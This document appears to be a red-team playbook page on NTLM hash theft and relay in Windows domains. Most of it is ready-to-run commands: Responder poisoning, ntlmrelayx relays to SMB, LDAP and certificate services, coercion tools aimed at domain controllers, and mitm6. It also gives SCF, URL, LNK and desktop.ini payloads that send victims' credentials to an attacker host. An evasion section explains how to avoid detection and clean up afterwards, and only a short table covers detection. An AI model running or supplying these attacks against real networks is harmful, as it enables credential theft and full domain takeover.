# NTLM Theft & Relay

> **MITRE ATT&CK**: Credential Access > T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
> **Platforms**: Windows / Linux (attacker tools)
> **Required Privileges**: User (network access) / Local Admin (some coercion techniques)
> **OPSEC Risk**: Medium

## Strategic Overview

NTLM authentication remains pervasive in enterprise Windows environments despite Microsoft's
push toward Kerberos. NTLM theft and relay attacks exploit the challenge-response nature
of NTLM to either capture hashes for offline cracking or relay authentication to other
services for immediate access.

**As a Red Team Lead, NTLM attacks are foundational because:**
- They work from a low-privilege foothold (any domain user with network access)
- Relay attacks provide immediate code execution without cracking passwords
- Coercion techniques can force high-privilege accounts (including DCs) to authenticate
- They chain directly into domain compromise (RBCD, ADCS abuse, DCSync)

**Attack categories:**
1. **Poisoning** - Answer name resolution queries to capture hashes (passive)
2. **Coercion** - Force specific machines to authenticate to you (active)
3. **Relay** - Forward captured authentication to another service (real-time)
4. **File-based theft** - Drop files in shares that trigger NTLM authentication

## Technical Deep-Dive

### 1. LLMNR/NBT-NS/mDNS Poisoning

```bash
# Responder - the standard tool for name resolution poisoning
# Captures Net-NTLMv2 hashes when clients resolve names via broadcast protocols

# Standard capture mode
responder -I eth0 -wrf

# Analysis mode (passive, no poisoning - for scoping)
responder -I eth0 -A

# Specific protocol targeting
responder -I eth0 -wrf --lm        # Force LM downgrade (easier to crack, very noisy)

# Captured hashes stored in:
# /usr/share/responder/logs/
# Format: username::domain:challenge:response:challenge

# Crack captured Net-NTLMv2 hashes
hashcat -m 5600 captured_hashes.txt wordlist.txt -r rules/best64.rule
john --wordlist=wordlist.txt captured_hashes.txt
```

### 2. NTLM Relay to SMB (Code Execution)

```bash
# ntlmrelayx - relay captured authentication to target SMB services
# Requires: SMB signing disabled on targets

# Check SMB signing across the network
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets_nosigning.txt

# Basic relay for code execution (runs secretsdump on successful relay)
ntlmrelayx.py -tf targets_nosigning.txt -smb2support

# Relay with specific command execution
ntlmrelayx.py -tf targets_nosigning.txt -smb2support -c "whoami > C:\temp\pwned.txt"

# Relay with interactive SMB shell
ntlmrelayx.py -tf targets_nosigning.txt -smb2support -i
# Connect to the interactive shell: nc 127.0.0.1 11000

# Socks proxy mode (maintain relay sessions for manual use)
ntlmrelayx.py -tf targets_nosigning.txt -smb2support -socks
# Use proxychains with Impacket tools through the SOCKS relay

# Combined: Responder (poisoning) + ntlmrelayx (relay)
# Terminal 1: responder -I eth0 -wrf  (disable SMB and HTTP servers)
# Edit Responder.conf: SMB = Off, HTTP = Off
# Terminal 2: ntlmrelayx.py -tf targets.txt -smb2support
```

### 3. Relay to LDAP (RBCD / ACL Abuse)

```bash
# Relay to LDAP for Resource-Based Constrained Delegation attack
ntlmrelayx.py -t ldap://dc01.corp.local --delegate-access -smb2support
# Creates a new machine account and sets RBCD on the target

# Relay to LDAP for ACL abuse (grant DCSync rights)
ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user compromised_user -smb2support

# Relay to LDAPS (if LDAP signing is enforced but LDAPS channel binding is not)
ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support

# After RBCD is configured, complete the attack:
getST.py -spn cifs/target.corp.local corp.local/NEWMACHINE\$:Password123 -impersonate Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@target.corp.local
```

### 4. Relay to ADCS (ESC8 - HTTP Enrollment)

```bash
# Relay to Active Directory Certificate Services web enrollment
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template DomainController

# If relaying a DC's machine account, you get a DC certificate
# Use the certificate for authentication:
# Extract with: certipy auth -pfx dc01.pfx
# Gives you the DC's NTLM hash → DCSync

# Relay to ADCS with specific template
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template Machine
```

### 5. Authentication Coercion Techniques

```bash
# PetitPotam - EfsRpcOpenFileRaw (coerce DC to authenticate)
# Original (patched but bypasses exist)
PetitPotam.py attacker_ip dc01.corp.local
PetitPotam.py -u user -p Password123 -d corp.local attacker_ip dc01.corp.local

# PrinterBug / SpoolSample (Print Spooler coercion)
# Requires Print Spooler service running on target
SpoolSample.exe dc01.corp.local attacker_ip
printerbug.py corp.local/user:Password123@dc01.corp.local attacker_ip

# Coercer - automated coercion testing across multiple protocols
coercer coerce -u user -p Password123 -d corp.local -l attacker_ip -t dc01.corp.local
coercer scan -u user -p Password123 -d corp.local -t dc01.corp.local  # enumerate available methods

# DFSCoerce
dfscoerce.py -u user -p Password123 -d corp.local attacker_ip dc01.corp.local

# ShadowCoerce (VSS coercion)
shadowcoerce.py -u user -p Password123 -d corp.local attacker_ip dc01.corp.local
```

### 6. mitm6 (IPv6 DNS Takeover)

```bash
# mitm6 exploits the default IPv6 configuration in Windows
# Acts as a rogue DHCPv6/DNS server to redirect traffic

# Terminal 1: Start mitm6
mitm6 -d corp.local

# Terminal 2: Start ntlmrelayx targeting LDAP
ntlmrelayx.py -6 -t ldaps://dc01.corp.local --delegate-access -wh wpad.corp.local

# How it works:
# 1. mitm6 responds to DHCPv6 requests, sets attacker as DNS server
# 2. Victim queries attacker's DNS for WPAD
# 3. Attacker returns WPAD config pointing to attacker's HTTP proxy
# 4. Victim authenticates to attacker's proxy with NTLM
# 5. ntlmrelayx relays the authentication to LDAP
```

### 7. File-Based NTLM Theft

```bash
# Drop files in writable shares that trigger NTLM authentication when browsed

# SCF file (triggers on folder browse in Explorer)
# Create file: @evil.scf
[Shell]
Command=2
IconFile=\\attacker_ip\share\icon.ico

# URL file
[InternetShortcut]
URL=file://attacker_ip/share
IconFile=\\attacker_ip\share\icon.ico
IconIndex=0

# LNK file (shortcut with UNC icon path)
# Use PowerShell to create:
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("\\share\evil.lnk")
$lnk.IconLocation = "\\attacker_ip\share\icon.ico"
$lnk.Save()

# Desktop.ini (triggers when folder is browsed)
[.ShellClassInfo]
IconResource=\\attacker_ip\share\icon.ico,0

# Library-ms file
# searchConnectorDescription pointing to \\attacker_ip\share

# Outlook rules/forms (trigger NTLM auth via email)
# Create rule that loads image from \\attacker_ip\share\image.png
```

### 8. WebDAV NTLM Theft

```bash
# WebDAV requests can trigger NTLM auth over HTTP (relayable even with SMB signing)
# WebClient service must be running on victim

# Check WebClient status remotely
crackmapexec smb target -u user -p pass -M webdav

# Start WebClient service remotely (via SearchProtocolHost trick)
# Or use the following to trigger it:
# Map WebDAV share: net use * http://attacker_ip/

# Coerce via WebDAV (HTTP-based, bypasses SMB signing)
PetitPotam.py -u user -p pass -d corp.local attacker_ip@80/path target.corp.local
```

### 9. Responder Multi-Protocol Capture

```bash
# Responder captures across multiple protocols:
# - LLMNR (UDP 5355)
# - NBT-NS (UDP 137)
# - mDNS (UDP 5353)
# - WPAD proxy auth (HTTP)
# - SMB (TCP 445)
# - HTTP (TCP 80)
# - FTP (TCP 21)
# - LDAP (TCP 389)
# - SQL (TCP 1433)

# Custom Responder configuration
# Edit /etc/responder/Responder.conf
# Enable/disable specific servers
# Set WPAD script content for proxy attacks
```

## Detection & Evasion

### Detection Indicators

| Indicator | Source | Detail |
|-----------|--------|--------|
| LLMNR/NBT-NS responses | Network IDS | Unusual hosts responding to broadcast queries |
| SMB relay patterns | Network monitoring | Auth from one host relayed to another in milliseconds |
| New machine accounts | Event ID 4741 | RBCD attack creates machine accounts |
| IPv6 DHCPv6 traffic | Network IDS | Rogue DHCPv6 server (mitm6) |
| WPAD requests to rogue | Proxy logs | WPAD configuration from unexpected source |
| Coercion RPC calls | Event ID 5145 | Named pipe access for EFS/Print Spooler |

### Evasion Techniques

1. **Target specific hosts** - Avoid mass poisoning; target only high-value subnets
2. **Use WebDAV relay** - Bypasses SMB signing requirements
3. **Time-limited poisoning** - Run Responder in short bursts during business hours
4. **Avoid responder artifacts** - Use custom tools instead of default Responder signatures
5. **Relay over HTTPS** - Use LDAPS relay to avoid plaintext LDAP monitoring
6. **Clean up machine accounts** - Remove RBCD machine accounts after use

### Defensive Gaps to Exploit

```
# Common gaps in enterprise environments:
# - LLMNR/NBT-NS not disabled (most common finding)
# - SMB signing not enforced (required only on DCs by default)
# - LDAP signing/channel binding not enforced
# - Print Spooler running on DCs
# - ADCS web enrollment enabled with HTTP (no HTTPS enforcement)
# - IPv6 enabled but not monitored
# - WebClient service enabled on workstations
```

## Cross-References

- [Password Cracking](password-cracking.md) - Crack captured Net-NTLMv2 hashes
- [Kerberos Attacks](kerberos-credential-attacks.md) - Alternative credential theft
- [DCSync](dcsync.md) - Follow-up after relay to LDAP for DCSync rights
- [LSASS Dumping](lsass-dumping.md) - Follow-up after relay-based code execution
- ../06-lateral-movement/ - Relay attacks as lateral movement mechanism
- ../12-active-directory-deep-dive/ - ADCS and RBCD attack chains

## References

- https://attack.mitre.org/techniques/T1557/001/
- https://github.com/lgandx/Responder
- https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
- https://github.com/topotam/PetitPotam
- https://github.com/p0dalirius/Coercer
- https://github.com/dirkjanm/mitm6
- https://www.thehacker.recipes/ad/movement/ntlm/
